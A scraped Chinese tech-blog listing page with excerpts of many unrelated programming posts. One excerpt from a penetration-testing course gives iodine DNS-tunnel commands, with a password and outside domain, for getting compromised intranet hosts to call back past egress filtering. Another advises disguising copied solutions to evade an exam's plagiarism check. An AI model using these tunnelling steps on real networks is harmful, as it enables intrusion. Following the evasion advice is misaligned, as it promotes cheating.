所以最好在牛-客上提前熟悉这种模式。例如C++使用cin/cout,python使用input()/print()。JavaScript使用node的readline()和console.log()。Java 使用sacnner/system.out.print()
机考代码查重 华为OD机考完成之后，官方会进行代码查重。华为 od 机考确实有很大的概率抽到原题。如果碰到了题库中的原题，一定不要直接使用题解中的代码，尤其是变量名，一定要修改，可以改成毫无意义的单词。除了变量名之外，代码的组织结构和逻辑一定要进行改变，这就要求在日常的刷题中，提前编写好属于自己的代码。
2023华为OD统一考试（B卷） - 100分值 题目链接知识点敏感字段加密https://blog.csdn.net/banxia_frontend/article/details/130042378字符串IPv4地址转换成整数https://blog.csdn.net/banxia_frontend/article/details/130042566字符串报文重排序https://blog.csdn.net/banxia_frontend/article/details/130814556字符串整数编码https://blog.csdn.net/banxia_frontend/article/details/130816655阿里巴巴找黄金宝箱 (1)https://blog.csdn.net/banxia_frontend/article/details/130817028指针VLAN资源池https://blog.csdn.net/banxia_frontend/article/details/130042590逻辑分析统计监控器、需要打开多少监控器https://blog.csdn.net/banxia_frontend/article/details/130875613逻辑分析求字符串中所有整数的最小和https://blog.csdn.net/banxia_frontend/article/details/130043034逻辑分析求满足条件的最长子串的长度https://blog.csdn.net/banxia_frontend/article/details/130043268滑动窗口字符串分割https://blog.csdn.net/banxia_frontend/article/details/130888094字符串简易压缩算法https://blog.csdn.net/banxia_frontend/article/details/130887642字符串一种字符串压缩表示的解压https://blog.csdn.net/banxia_frontend/article/details/130043674字符串矩阵最大值https://blog.csdn.net/banxia_frontend/article/details/130044296逻辑分析字符串加密https://blog.csdn.net/banxia_frontend/article/details/130047719动态规划英文输入法https://blog.csdn.net/banxia_frontend/article/details/130047940字符串拼接URLhttps://blog.csdn.net/banxia_frontend/article/details/130049091正则匹配相对开音节https://blog.csdn.net/banxia_frontend/article/details/130057726正则匹配最远足迹https://blog.csdn.net/banxia_frontend/article/details/130057872数据结构字符串序列判定https://blog.csdn.net/banxia_frontend/article/details/130069530指针数列描述https://blog.csdn.net/banxia_frontend/article/details/130070682动态规划寻找相同子串https://blog.csdn.net/banxia_frontend/article/details/130071234字符串字符串变换最小字符串https://blog.csdn.net/banxia_frontend/article/details/129289091字符串找终点https://blog.csdn.net/banxia_frontend/article/details/130117501逻辑分析执行时长https://blog.csdn.net/banxia_frontend/article/details/130119270逻辑分析用户调度问题https://blog.csdn.net/banxia_frontend/article/details/130889808深度优先搜索DFS数组拼接https://blog.csdn.net/banxia_frontend/article/details/130173373字符串检查是否存在满足条件的数字组合https://blog.csdn.net/banxia_frontend/article/details/130174695深度优先搜索DFS水仙花数 Ⅰhttps://blog.csdn.net/banxia_frontend/article/details/130171852逻辑分析路灯照明问题https://blog.csdn.net/banxia_frontend/article/details/130174877区间问题 / 区间合并消消乐游戏https://blog.csdn.net/banxia_frontend/article/details/130177360数据结构用连续自然数之和来表达整数https://blog.csdn.net/banxia_frontend/article/details/130172885滑动窗口最大花费金额https://blog.csdn.net/banxia_frontend/article/details/130116925滑动窗口分糖果https://blog.csdn.net/banxia_frontend/article/details/130116367位运算猴子爬山https://blog.csdn.net/banxia_frontend/article/details/130115751动态规划数组组成的最小数字https://blog.csdn.net/banxia_frontend/article/details/130114597字符串整型数组按个位值排序https://blog.csdn.net/banxia_frontend/article/details/129306346字符串运维日志排序https://blog.csdn.net/banxia_frontend/article/details/130114406字符串字符统计及重排https://blog.csdn.net/banxia_frontend/article/details/130173033字符串按身高和体重排队https://blog.csdn.net/banxia_frontend/article/details/130104661字符串磁盘容量排序https://blog.csdn.net/banxia_frontend/article/details/130104442双指针5键键盘https://blog.csdn.net/banxia_frontend/article/details/130096051逻辑分析报数游戏https://blog.csdn.net/banxia_frontend/article/details/130095889约瑟夫环问题高矮个子排队https://blog.csdn.net/banxia_frontend/article/details/130095797滑动窗口分班问题https://blog.csdn.net/banxia_frontend/article/details/130095305逻辑分析喊7的次数重排https://blog.csdn.net/banxia_frontend/article/details/130072441约瑟夫环问题玩牌高手https://blog.csdn.net/banxia_frontend/article/details/130072194动态规划最少交换次数https://blog.csdn.net/banxia_frontend/article/details/130042175滑动窗口水仙花数Ⅱhttps://blog.csdn.net/banxia_frontend/article/details/130036570分治递归关联子串https://blog.csdn.net/banxia_frontend/article/details/130036439深度优先搜索DFS矩形相交的面积https://blog.csdn.net/banxia_frontend/article/details/130036104逻辑分析数字反转打印https://blog.csdn.net/banxia_frontend/article/details/130022410逻辑分析太阳能板最大面积https://blog.csdn.net/banxia_frontend/article/details/130022091双指针绘图机器https://blog.csdn.net/banxia_frontend/article/details/130022003逻辑分析字符串子序列IIhttps://blog.csdn.net/banxia_frontend/article/details/130010116双指针求最多可以派出多少支团队https://blog.csdn.net/banxia_frontend/article/details/130009910双指针流水线https://blog.csdn.net/banxia_frontend/article/details/130000922逻辑分析事件推送、 所有（Ai, Bj）数对https://blog.csdn.net/banxia_frontend/article/details/130000553逻辑分析找朋友https://blog.csdn.net/banxia_frontend/article/details/129999376数据结构统计射击比赛成绩https://blog.csdn.net/banxia_frontend/article/details/129998971字符串分苹果https://blog.csdn.net/banxia_frontend/article/details/129998670位运算最长的顺子https://blog.csdn.net/banxia_frontend/article/details/129793342逻辑分析斗地主之顺子https://blog.csdn.net/banxia_frontend/article/details/129844867数据结构热点网站统计https://blog.csdn.net/banxia_frontend/article/details/129895021字符串出错的或电路https://blog.csdn.net/banxia_frontend/article/details/129939817深度优先搜索DFS快速人名查找https://blog.csdn.net/banxia_frontend/article/details/129827444回溯算法比赛https://blog.csdn.net/banxia_frontend/article/details/130898490字符串补种未成活胡杨https://blog.csdn.net/banxia_frontend/article/details/130900032滑动窗口五子棋迷https://blog.csdn.net/banxia_frontend/article/details/130900644滑动窗口组成最大数https://blog.csdn.net/banxia_frontend/article/details/130901124字符串全量和已占用字符集https://blog.csdn.net/banxia_frontend/article/details/130071738字符串乱序整数序列两数之和绝对值最小https://blog.csdn.net/banxia_frontend/article/details/130901386双指针寻找连续区间、数据连续和https://blog.csdn.net/banxia_frontend/article/details/130901621动态规划非严格递增连续数字序列https://blog.csdn.net/banxia_frontend/article/details/130901696指针快递运输https://blog.csdn.net/banxia_frontend/article/details/130901947逻辑分析不等式是否满足约束并输出最大差https://blog.csdn.net/banxia_frontend/article/details/130902299逻辑分析靠谱的车https://blog.csdn.net/banxia_frontend/article/details/130902533位运算选修课https://blog.csdn.net/banxia_frontend/article/details/130903630位运算连续字母长度https://blog.csdn.net/banxia_frontend/article/details/130048972正则匹配找车位https://blog.csdn.net/banxia_frontend/article/details/130019456逻辑分析数字涂色https://blog.csdn.net/banxia_frontend/article/details/130172193逻辑分析查找众数及中位数https://blog.csdn.net/banxia_frontend/article/details/129288857逻辑分析数组去重和排序https://blog.csdn.net/banxia_frontend/article/details/129720509字符串单词接龙https://blog.csdn.net/banxia_frontend/article/details/130044643字符串最长公共后缀https://blog.csdn.net/banxia_frontend/article/details/1309103293排序 2023华为OD统一考试（B卷） - 200分值 题目链接知识点书籍叠放https://blog.csdn.net/banxia_frontend/article/details/130903074耐心排序 + 二分查找We Are A Teamhttps://blog.csdn.net/banxia_frontend/article/details/130115654数据结构 / 并查集区间交集https://blog.csdn.net/banxia_frontend/article/details/129793003区间问题 / 区间合并跳格子游戏https://blog.csdn.net/banxia_frontend/article/details/129866599图论 / 拓扑排序找单词https://blog.csdn.net/banxia_frontend/article/details/130189657深度优先搜索DFS字符串比较https://blog.csdn.net/banxia_frontend/article/details/129813983双指针德州扑克https://blog.csdn.net/banxia_frontend/article/details/129987036逻辑分析服务失效判断https://blog.csdn.net/banxia_frontend/article/details/129867851数据结构 / 并查集打印任务排序https://blog.csdn.net/banxia_frontend/article/details/129720672字符串最少面试官数https://blog.csdn.net/banxia_frontend/article/details/129894367贪心思维欢乐的周末https://blog.csdn.net/banxia_frontend/article/details/129941687数据结构 / 并查集找最小数https://blog.csdn.net/banxia_frontend/article/details/129951423数据结构单词搜索、找到它https://blog.csdn.net/banxia_frontend/article/details/129793166回溯算法解密犯罪时间https://blog.csdn.net/banxia_frontend/article/details/130036240深度优先搜索DFS九宫格按键输入https://blog.csdn.net/banxia_frontend/article/details/129803233数据结构简易内存池https://blog.csdn.net/banxia_frontend/article/details/129786608区间问题 / 区间交集连续出牌数量https://blog.csdn.net/banxia_frontend/article/details/129786290数据结构 / 并查集图像物体的边界https://blog.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8ea10dd41b587e1b2aac6083b3077cac/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e5314bf8e2ec68c216347196d8b61829/" rel="bookmark">
			vCenter Server Appliance（VCSA ）7.0 部署指南
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		部署准备 1、下载VMware-VCSA-all-7.0.0-xxxx.iso文件，用虚拟光驱挂载或者解压运行，本地系统以win10拟光驱挂载为例，运行vcsa-ui-installer/win32/installer.exe。
2、选择“安装”，VCSA 7.0版本同时提供其他选项。
第一阶段 3、提示安装分为两个阶段。
4、勾选“我接受许可协议条款”。
5、指定VCSA 7.0部署到ESXi主机。
6、提示证书警告，选择“是”。
7、配置VCSA 7.0虚拟机名称以及root密码。
8、根据需求，选择部署大小。
9、选择VCSA 7.0虚拟机存储，勾选“精简磁盘模式”。
10、配置VCSA 7.0 虚拟机网络。
若用户无DNS，在此处设置DNS时，先设置成VC本身的IP。
11、确认第1阶段参数。
12、开始第一阶段部署，部署的时间取决于物理服务器性能。
13、完成第一阶段部署，开始第二阶段部署。
14、第一步骤完成安装后，进入该VC对应的虚机内，更改/etc/hosts文件，新增以下内容，将VC的地址解析为localhost
第二阶段 15、开始第二阶段配置。 16、配置NTP服务器。
17、配置SSO参数。
18、确认是否加入CEIP，此处取消勾选。
19、确认第二阶段部署参数。
20、确定开始第二阶段部署，部署时间取决于物理服务器性能。
21、完成第二阶段部署。
部署完成 22、访问VCSA 7.0 ，只提供H5界面。
23、SSO登入。
24、VCSA 7.0 首页界面展示。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ecbfe50f924ad3adebbcee28691d50c3/" rel="bookmark">
			Celery连接rabbitmq出现billiard.exceptions.RestartFreqExceeded: 5 in 1s，解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		[2023-08-04 10:28:39,866: DEBUG/MainProcess] Start from server, version: 0.9, properties: {'capabilities': {'publisher_confirms': True, 'exchange_exchange_bindings': True, 'basic.nack': True, 'consumer_cancel_notify': True, 'connection.blocked': True, 'consumer_priorities': True, 'authentication_failure_close': True, 'per_consumer_qos': True, 'direct_reply_to': True}, 'cluster_name': 'rabbit@NQ31', 'copyright': 'Copyright (c) 2007-2022 VMware, Inc. or its affiliates.', 'information': 'Licensed under the MPL 2.0. Website: https://rabbitmq.com', 'platform': 'Erlang/OTP 26.0.2', 'product': 'RabbitMQ', 'version': '3.10.8'}, mechanisms: [b'AMQPLAIN', b'PLAIN'], locales: ['en_US'] [2023-08-04 10:28:39,867: INFO/MainProcess] Connected to amqp://guest:**@127.0.0.1:5672// [2023-08-04 10:28:39,867: DEBUG/MainProcess] ^-- substep ok [2023-08-04 10:28:39,867: DEBUG/MainProcess] | Consumer: Starting Events [2023-08-04 10:28:39,867: DEBUG/MainProcess] Closed channel #1 [2023-08-04 10:28:39,867: WARNING/MainProcess] /home/nq/.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ecbfe50f924ad3adebbcee28691d50c3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43358b02d1d3d76f43d97554556a264b/" rel="bookmark">
			pycharm运行pytest无法实时输出信息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需要去掉控制台输出。根据查询相关信息显示pycharm运行pytest无法实时输出信息，需要去掉pycharm里面的运行模式，点击减号，再点击加号，添加python执行文件即可实时输出信息。
问题描述： 使用pycharm运行代码时，pytest代码运行没有log出现
原因解释： pycharm进入pytest运行模式文件名包含test的python脚本会默认以pytest运行模式运行 解决方法：
临时解决方法——对当前代码取消pytest运行模式：
1.进入运行配置
点击pycharm右上角的脚本配置，选择编辑配置
2.取消pytest模式
展开Python test，选择pytest for 脚本名；
点击上方的remove configuration，将脚本去除pytest模式；
点击应用，应用配置
3. 添加新配置
单击添加新配置，选择python类型；
选择脚本路径，选择python编译器（一般默认即可）
点击确定，应用配置
永久解决方法——取消所有名字含有test的脚本的pytest运行模式：
1. 取消pytest模式
参考临时解决方法1、2
2.更改testing的运行模式
打开文件-设置-工具-python集成工具；
将testing中的运行方式改为unittests；
确认保存
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a330930d5f8f27a0001d8589de0024f8/" rel="bookmark">
			call、apply、bind的使用方法和原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在js中有三种办法改变this的调用指向，ccall、apply、bind
一、call方法
1.原理：根据隐式的绑定规则obj.fn 当中的this指向的就是obj，那么我们只需要在调用call 方法时候，将当前的this赋值给要改变的对象身上，那么this的指向就根据隐式规则，绑定到了新的对象上，从而达到改变this指向的问题。
2.语法：function.call(thisArg, arg1, arg2, …)
3.仿写demo
//es5 写法 Function.prototype.es5Call = function (){ var rst = null, //定义一个对象 obj = arguments[0] || window, //拿到第一个参数 len = arguments.length, //拿到arguments长度 argArr = []; // 需要的参数数组 //组合传递过来的参数 'arguments[' + i + ']' ==&gt;'arguments[1] for (let i = 1; i &lt; len; i++) { argArr.push('arguments[' + i + ']'); //这里也可以用reduce的思想，但是用reduce会用到Array原型上的call方法，故而放弃。 } //保存this 当前this 指定的是 call前一个函数 obj.targetFunc = this; //利用eval当函数和参数互相组合 rst = eval('obj.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a330930d5f8f27a0001d8589de0024f8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/88f47322443d71f773dc9482f28027f0/" rel="bookmark">
			python one-hot编码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 将标签编码为0-1矩阵
import torch.nn.functional as F import torch num_class = 5 label = torch.tensor([0, 2, 2, 4, 1, 3]) one_hot = F.one_hot(label, num_classes=num_class ) print(one_hot) """ tensor([[1, 0, 0, 0, 0], [0, 0, 1, 0, 0], [0, 0, 1, 0, 0], [0, 0, 0, 0, 1], [0, 1, 0, 0, 0], [0, 0, 0, 1, 0]]) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e15c6861004674b9d166e12fec7d0deb/" rel="bookmark">
			【零基础学JS - 33 】ES6 扩展运算符 Spread Operator
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		👨‍💻 作者简介：程序员半夏 , 一名全栈程序员，擅长使用各种编程语言和框架，如JavaScript、React、Node.js、Java、Python、Django、MySQL等.专注于大前端与后端的硬核干货分享,同时是一个随缘更新的UP主. 你可以在各个平台找到我!
🏆 本文收录于专栏: 零基础学JavaScript,包含JavaScript 基础知识,DOM相关知识,高级知识点,最新ES特性
————————————————————————
🔥 热门专栏:
🥇 学透CSS: 全网阅读超百万,CSDN最强CSS专栏,精通CSS全属性，不做切图仔，从订阅本专栏开始!
🥇 SprinbBoot + Vue3 项目实战: 新鲜出炉的2023实战系列博客,配套视频,用心打磨,篇篇精品.持续更新,值得订阅!
文章目录 使用场景迭代对象或数组使用扩展运算符复制数组使用扩展运算符克隆数组与对象一起使用的扩展运算符 Rest参数 扩展运算符是JavaScript ES6版本中提供的新功能之一。
使用场景 迭代对象或数组 扩展运算符...用于展开可迭代对象或数组。例如，
const arrValue = ['My', 'name', 'is', 'Jack']; console.log(arrValue); // ["My", "name", "is", "Jack"] console.log(...arrValue); // My name is Jack 在这个例子中，代码：
console.log(...arrValue) 等同于：
console.log('My', 'name', 'is', 'Jack'); 使用扩展运算符复制数组 你也可以使用扩展语法...将项目复制到一个单独的数组中。例如，
const arr1 = ['one', 'two']; const arr2 = [...arr1, 'three', 'four', 'five']; console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e15c6861004674b9d166e12fec7d0deb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/20c9e76256c0ec7004d4a4411ecb608c/" rel="bookmark">
			Spring事务七大传播机制与五个隔离级别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、spring支持7种事务传播行为
1、propagation_required（xml文件中为required)
当前方法必须在一个具有事务的上下文中运行，如有客户端有事务在进行，那么被调用端将在该事务中运行，否则的话重新开启一个事务。（如果被调用端发生异常，那么调用端和被调用端事务都将回滚）。
2、propagation_supports(xml文件中为supports）
当前方法不必需要具有一个事务上下文，但是如果有一个事务的话，它也可以在这个事务中运行。
3、propagation_mandatory(xml文件中为mandatory）
表示当前方法必须在一个事务中运行，如果没有事务，将抛出异常。
4、propagation_nested(xml文件中为nested)
如果当前方法正有一个事务在运行中，则该方法应该运行在一个嵌套事务中，被嵌套的事务可以独立于被封装的事务中进行提交或者回滚。如果封装事务存在，并且外层事务抛出异常回滚，那么内层事务必须回滚，反之，内层事务并不影响外层事务。如果封装事务不存在，则同propagation_required的一样。
5、propagation_never（xml文件中为never)
当方法务不应该在一个事务中运行，如果存在一个事务，则抛出异常。
6、propagation_requires_new(xml文件中为requires_new）
当前方法必须运行在它自己的事务中。一个新的事务将启动，而且如果有一个现有的事务在运行的话，则这个方法将在运行期被挂起，直到新的事务提交或者回滚才恢复执行。
7、propagation_not_supported（xml文件中为not_supported）
方法不应该在一个事务中运行。如果有一个事务正在运行，他将在运行期被挂起，直到这个事务提交或者回滚才恢复执行。
二、spring中的事务隔离级别
1、isolation_default
使用数据库默认的事务隔离级别。
2、isolation_read_uncommitted
允许读取尚未提交的修改，可能导致脏读、幻读和不可重复读。
3、isolation_read_committed
允许从已经提交的事务读取，可防止脏读、但幻读，不可重复读仍然有可能发生。
4、isolation_repeatable_read
对相同字段的多次读取的结果是一致的，除非数据被当前事务自生修改。可防止脏读和不可重复读，但幻读仍有可能发生。
5、isolation_serializable
完全服从acid隔离原则，确保不发生脏读、不可重复读、和幻读，但执行效率最低。
三、几种常用数据库的默认隔离级别
MySQL
mysql默认的事务处理级别是'REPEATABLE-READ',也就是可重复读。
Oracle
oracle数据库支持READ COMMITTED 和 SERIALIZABLE这两种事务隔离级别。
默认系统事务隔离级别是READ COMMITTED,也就是读已提交。
SQL Server
默认系统事务隔离级别是read committed,也就是读已提交。
数据库中 脏读、幻读、不可重读是什么意思?
链文
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fffbe5f59ee10cbbf1a7dd649d761be5/" rel="bookmark">
			第126天：内网安全-隧道技术&amp;SSH&amp;DNS&amp;ICMP&amp;SMB&amp;上线通讯Linux&amp;Mac
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		知识点 #知识点： 1、入站规则不出网上线方案 2、出站规则不出网上线方案 3、隧道技术-SMB&amp;ICMP&amp;DNS&amp;SSH 4、控制上线-Linux&amp;Mac&amp;IOS&amp;Android -连接方向：正向&amp;反向（基础课程有讲过） -内网穿透：解决网络控制上线&amp;网络通讯问题 -隧道技术：解决不出网协议上线的问题（利用出网协议进行封装出网） -代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作） #系列点： 1、判断什么时候用代理 2、判断什么时候用隧道 3、判断出网和不出网协议 4、如何使用代理建立节点并连接 5、如何使用隧道技术封装协议上线 6、判断哪些代理或隧道情况选择放弃 演示案例 1、隧道技术-SMB协议-判断&amp;通讯&amp;上线 2、隧道技术-ICMP协议-判断&amp;通讯&amp;上线 3、隧道技术-DNS协议-判断&amp;通讯&amp;上线 4、隧道技术-SSH协议-判断&amp;通讯&amp;上线 5、控制上线-插件-Linux&amp;Mac&amp;IOS&amp;Android 1、判断出网协议 2、使用出网协议建立隧道 #SMB隧道&amp;通讯&amp;上线 判断：445通讯 上线：借助通讯后绑定上线 通讯：直接SMB协议通讯即可 #ICMP隧道&amp;通讯&amp;上线 判断：ping命令 上线：见前面课程 通讯：其他项目(icmpsh icmptunnel) https://github.com/esrrhs/spp https://github.com/bdamele/icmpsh https://github.com/esrrhs/pingtunnel #DNS隧道&amp;通讯&amp;上线 判断：nslookup dig 1、上线环境：内网主机只出网DNS协议数据，解决上线 -域名申请及配置 -监听器创建及配置 -后门绑定监听器及生成 2、通讯环境： 内网主机只出网DNS协议数据，解决通讯 https://github.com/yarrick/iodine 判断出网：nslookup www.baidu.com -服务器：设置密码xiaodi并创建虚拟IP及绑定域名指向 iodined -f -c -P xiaodi 192.168.0.1 ns1.xiaodi8.com -DD 设置密码xiaodi并创建虚拟IP及绑定域名指向 -客户端：连接密码xiaodi并绑定域名指向 iodine -f -M 200 -P xiaodi ns1.xiaodi8.com -尝试通讯尝试连接： ssh root@192.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fffbe5f59ee10cbbf1a7dd649d761be5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c5ccf9d86a073305d9b78fae1f610d3/" rel="bookmark">
			Spark编程基础期末复习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		选择题 1. spark 的四大组件下面哪个不是 (D) A.Spark Streaming B Mlib C Graphx D Spark R
2.下面哪个端口不是 spark 自带服务的端口 ( C) A.8080 B.4040 C.8090 D.18080
3.spark 1.4 版本的最大变化 ( B) A spark sql Release 版本 B 引入 Spark R C DataFrame D支持动态资源分配
4. Spark Job 默认的调度模式 ( A) A FIFO B FAIR C 无 D 运行时指定
5.哪个不是本地模式运行的条件 ( D) A spark.localExecution.enabled=true B 显式指定本地运行 C finalStage 无父 Stage D partition默认值
6.下面哪个不是 RDD 的特点 (C ) A.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5c5ccf9d86a073305d9b78fae1f610d3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/82ea9f0b07e3812b5680f399f9078d06/" rel="bookmark">
			使用xlsx.js导出有复杂表头的excel
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前端使用xlsx.js导出有复杂表头的excel 参考： Vue项目中使用xlsx-style导出有格式的表格，这个博客中的实现是针对单个excel手写合并样式，比较繁琐。
我这里实现了根据table的表头数据结构，自动生成和页面上相同的excel表格。
2023-08-03 更新: demo已经重新部署了，可以访问；
另外已经2023年了， 其实可以试试 exceljs, 其中有个 PR1899 实现了根据json数据动态生成多级表头， 但还没有被合并。
1、简介 需求要导出表格数据到excel，本来想在后端用poi来弄，但是回想起之前同事被poi支配的恐惧，我搜了一下还是觉得在前端使用xlsx.js来搞，这样比较简单。虽然没有要求表格样式，但是我觉得还是弄成多级表头比较好看。
2、效果 页面导出数据:在线预览
图片1
![8](https://img-blog.csdnimg.cn/img_convert/e2d4219d438eef8aa6dc92a643658fea.png
根据表头结构，自动合并excel单元格，生成的文件如下
图片2
3、实现 请先阅读上面连接中的博客，我这里只是增强，不再重复赘述;其中的xlsx.full.min.js依赖需要按照参考博客中的方式下载，安装到本地;或者打开步骤2的预览，f12 找到对应加载的资源 copy 到你本地。 1、表头结构 表头的包含关系可用json很好的表达出来，其中子表头放在父表头的child属性中，依次类推，无限嵌套
[ { name: '姓名', prop: 'name', }, { name: '专业技能', child: [ { name: '前端', child: [ { name: 'JavaScript', prop: 'js' }, { name: 'CSS', prop: 'css' } ] }, { name: '后端', child: [ { name: 'java', child: [ { name: 'nio', prop: 'nio' }, { name: '基础', prop: 'basic' } ] }, { name: '框架', child: [ { name: 'SpringBoot', prop: 'springboot' }, { name: 'MyBatis', prop: 'mybatis' } ] } ] }, ] }, ] 2、计算合并数据 关键点在于如何根据表头的步骤3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/82ea9f0b07e3812b5680f399f9078d06/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f1d26500a69ebe8bfbb7916e4d4c19f5/" rel="bookmark">
			设计模式创建型——原型模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
什么是原型模式
原型模式的实现
原型模式分类
浅克隆和深克隆的区别
原型模式浅克隆
原型模式深克隆
原型模式简单实现方式
原型模式登记实现方式
原型模式的特点
特点
优点
缺点
应用场景
什么是原型模式 原型模式（Prototype Pattern）是用于创建重复的对象，同时又能保证性能。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式之一。用原型实例指定创建对象的种类，并且通过拷贝这些原型，创建新的对象，允许一个对象再创建另外一个可定制的对象，无需知道如何创建的细节。
原型模式简化了创建对象的过程，通过一个已有的实例进行复制提高了创建实例的效率，具有较好的可扩展性。
通过将一个原型对象传给那个要发动创建的对象，这个要发动创建的对象通过请求原型对象拷贝它们自己来实施创建，即 对象.clone()，用于创建当前对象的克隆。当直接创建对象的代价比较大时，则采用这种模式。例如，一个对象需要在一个高代价的数据库操作之后被创建。我们可以缓存该对象，在下一个请求时返回它的克隆，在需要的时候更新数据库，以此来减少数据库调用。
原型模式的实现 原型模式分类 浅克隆：创建一个新对象，新对象的属性和原来对象完全相同，对于非基本类型属性，仍指向原有属性所指向的对象的内存地址。深克隆：创建一个新对象，属性中引用的其他对象也会被克隆，不再指向原有对象地址。 浅克隆和深克隆的区别 使用浅克隆时，当原型对象被复制时，只复制它本身和其中包含的值类型的成员变量，而引用类型的成员变量并没有复制；而使用深克隆时，除了对象本身被复制外，对象所包含的所有成员变量也将被复制。
在java 中，浅克隆是继承Cloneable接口后重写clone方法完成的克隆，而深克隆需要继承序列化接口Serializable，使类可以序列化，然后将类写入流中再从流中取出完成克隆。
下面我们用代码展示浅克隆和深克隆。
原型模式浅克隆 /** * @author Evan Walker * @version 1.0 * @desc 昂焱数据: https://www.ayshuju.com * @date 2023/04/10 14:17:40 */ public class Room implements Cloneable { public Room room; private String name; private int size; private String color; private String address = "上海市奉贤区奉城镇南奉公路686号4幢"; public Room() { } public Room(String name, int size, String color) { super(); this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f1d26500a69ebe8bfbb7916e4d4c19f5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f40e615e32ed0fa025d5cfa40289a292/" rel="bookmark">
			PyTorch Lightning教程六：优化代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有时候模型训练很慢，代码写得冗长之后，没法诶个检查到底那块出现了占用了时空间，本节通过利用Lightning的一些方法，检查分析是那块代码出现了问题，从而来进一步指导和优化代码
本节主要基于性能分析方法，通过捕获分析信息（例如函数花费的时间或使用了多少内存）帮助我们找到代码中的瓶颈。
找到训练时候的瓶颈 最基本的性能分析配置文件，包含训练中Callback、DataModules和LightningModule中的所有关键方法。可以通过如下方法引入
trainer = Trainer(profiler="simple") 一旦执行.fit()方法，则可以看到如下类似结果
FIT Profiler Report ----------------------------------------------------------------------------------------------- | Action | Mean duration (s) | Total time (s) | ----------------------------------------------------------------------------------------------- | [LightningModule]BoringModel.prepare_data | 10.0001 | 20.00 | | run_training_epoch | 6.1558 | 6.1558 | | run_training_batch | 0.0022506 | 0.015754 | | [LightningModule]BoringModel.optimizer_step | 0.0017477 | 0.012234 | | [LightningModule]BoringModel.val_dataloader | 0.00024388 | 0.00024388 | | on_train_batch_start | 0.00014637 | 0.0010246 | | [LightningModule]BoringModel.teardown | 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f40e615e32ed0fa025d5cfa40289a292/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e514c5ca0861661672d24f46660c928/" rel="bookmark">
			如何在静态方法中使用泛型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Java中，静态方法不能直接使用类的泛型参数（Type Parameters），因为泛型是与类实例相关的，而静态方法不依赖于类的实例。但是，我们可以在静态方法上使用自己的泛型参数，使得该静态方法可以使用泛型。
要在静态方法中使用泛型，可以在方法上声明自己的泛型参数，与类的泛型参数无关。这样，该静态方法可以独立地使用自己的泛型类型。下面是一个示例：
public class MyClass&lt;T&gt; { private T value; // 非静态方法，可以使用类的泛型参数 T public T getValue() { return value; } public void setValue(T value) { this.value = value; } // 静态方法使用自己的泛型参数 U public static &lt;U&gt; void staticMethod(U param) { System.out.println("Static method parameter: " + param); } } public class Main { public static void main(String[] args) { MyClass&lt;Integer&gt; myClass = new MyClass&lt;&gt;(); myClass.setValue(42); Integer value = myClass.getValue(); System.out.println("Value: " + value); // 静态方法调用，不依赖于类的实例 MyClass.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e514c5ca0861661672d24f46660c928/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4a3b9b624549b98b3563b70151e10d59/" rel="bookmark">
			设计模式-工厂模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
